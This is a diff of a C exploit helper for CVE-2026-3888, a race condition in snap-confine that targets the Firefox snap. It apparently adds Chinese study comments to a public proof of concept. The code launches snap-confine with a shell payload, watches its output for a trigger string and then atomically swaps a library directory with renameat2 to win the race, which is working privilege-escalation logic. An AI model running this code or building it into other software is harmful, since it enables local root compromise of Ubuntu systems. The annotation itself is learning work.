@@ -1,4 +1,4 @@
-/*
+ /*
  * firefox_2404.c - CVE-2026-3888 Race Helper
  *
  * https://raw.githubusercontent.com/nomaisthere/CVE-2026-3888/refs/heads/main/src/firefox_2404.c
@@ -215,53 +215,46 @@ static int run_and_race(void)
         *-write PID + perms for verification 写PID + perms进行验证
         *-keep namespace alive 保持命名空间存活
         */
-        execl(SNAP_CONFINE, "snap-confine",
+        execl(SNAP_CONFINE, "snap-confine",    //execl(path, arg0, arg1, ..., NULL);用一个新程序 替换当前进程
               "--base", "core22",
               "snap.firefox.hook.configure",
               "/bin/sh", "-c",
-              "echo $$ > /tmp/race_pid.txt; "
-              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
-              "> /tmp/race_perms.txt 2>&1; "
-              "sleep 99994",
+              "echo $$ > /tmp/race_pid.txt; "    //记录 PID,给外部（父进程）提供同步点
+              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "    //检查动态链接器权限 获取:owner group 权限位
+              "> /tmp/race_perms.txt 2>&1; "    //把 stderr（2）重定向到 stdout（1）,fd = 1（stdout）正常输出 ，fd 2（stderr）现在和 fd 1（stdout）指向同一个输出目标
+              "sleep 99994",    //让进程长期存活，给 race 留时间窗口
               NULL);
         _exit(1);
     }
 
-        */
-        execl(SNAP_CONFINE, "snap-confine",
-              "--base", "core22",
-              "snap.firefox.hook.configure",
-              "/bin/sh", "-c",
-              "echo $$ > /tmp/race_pid.txt; "
-              "stat-c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
-              "> /tmp/race_perms.txt 2>&1; "
-              "sleep 99994",
-              NULL);
-        _exit(1);
-    }
-
-    /* Parent: read snap-confine's output and watch for trigger */
-    close(write_fd);
-    /* Ring buffer to detect TRIGGER */
+    /* Parent父级：读取snap-restrict的输出并观察是否触发 */
+    //从子进程（snap-confine）的输出里“监听触发点（TRIGGER）”，一旦检测到，就准备执行 race 操作
+    close(write_fd);    //父进程只保留read_fd（读端），目的：只读子进程输出，不再写
+    /* 环形缓冲区检测触发器    ring buffer */
     char ringbuf[4096];
     int ringpos = 0;
     memset(ringbuf, 0, sizeof(ringbuf));
-    int tlen = strlen(TRIGGER);
-    char byte;
-    ssize_t n;
-    int swapped = 0;
-    printf("[*] Reading snap-confine output (PID %d)...\n", pid);
+    //void *memset(void *ptr, int value, size_t num); 把一段内存全部填成同一个值,'把 ringbuf 的 4096 个字节全部变成 0',, ptr（起始地址）
+    
+    int tlen = strlen(TRIGGER);    //TRIGGER 是一个字符串（关键）,通常是 某段 debug 输出 / 日志标志， 用来判断snap-confine 是否执行到了某个关键阶段
+    char byte;    //单字节读取变量
+    ssize_t n;    //ssize_t是一种带符号的整数类型表示“大小 + 错误”；  size_t 无符号，表示“大小”（永远 ≥ 0）
+    int swapped = 0;    //标记：还没有执行替换
+    printf("[*] Reading snap-confine output (PID %d)...\n", pid);    //socket 读取循环是否继续，socket 读取循环是否继续；n <= 0 → 结束 / 出错
 
-    /* Read 1 byte-> briefly unblock writer-> regain control */
-    while ((n = read(read_fd, &byte, 1)) > 0) {
-        /* Echo snap-confine's output to stdout for visibility */
-        write(STDOUT_FILENO, &byte, 1);
 
-        /* Add byte to ring buffer */
+    /* 读取1个字节-暂时解除写入器阻塞-重新获得控制权*/
+    while ((n = read(read_fd, &byte, 1)) > 0) {    //单字节读的目的：精细控制时序，方便精准匹配触发点
+        //ssize_t read(int fd, void *buf, size_t count); socket 的读端，缓冲区地址，缓冲区地址。从 read_fd 读 1 个字节 → 存到 byte 里
+        /* 将snap-restrict的输出回显到stdout以获得可见性 */
+        write(STDOUT_FILENO, &byte, 1);    //把读到的内容实时打印到终端
+        //标准输出（终端屏幕），把 byte 这个字符输出到终端
+
+        /* 向环形缓冲区添加字节 */
         ringbuf[ringpos % sizeof(ringbuf)] = byte;
         ringpos++;
 
-        /* Check for trigger once we have enough bytes */
+        /* 一旦我们有足够的字节，检查触发器 */
         if (!swapped && ringpos >= tlen) {
             char check[512];
             for (int i = 0; i < tlen && i < (int)sizeof(check)-1; i++)
@@ -271,15 +264,15 @@ static int run_and_race(void)
             if (strstr(check, TRIGGER)) {
                 printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
 
-                /* Trigger hit: snap-confine paused after Step 1-> safe to swap */
+                /* 触发命中：快照限制暂停后，步骤1-安全交换 */
                 #ifndef RENAME_EXCHANGE
                 #define RENAME_EXCHANGE (1 << 1)
                 #endif
                 if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                             AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
-                    /* Atomic swap succeeded */
+                    /* 原子交换成功 */
                 } else {
-                    /* Fallback if renameat2 unavailable (non-atomic) */
+                    /* 如果renameat2不可用（非原子），则回退) */
                     rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
                     rename(EXCHANGE_SRC, EXCHANGE_DST);
                 }
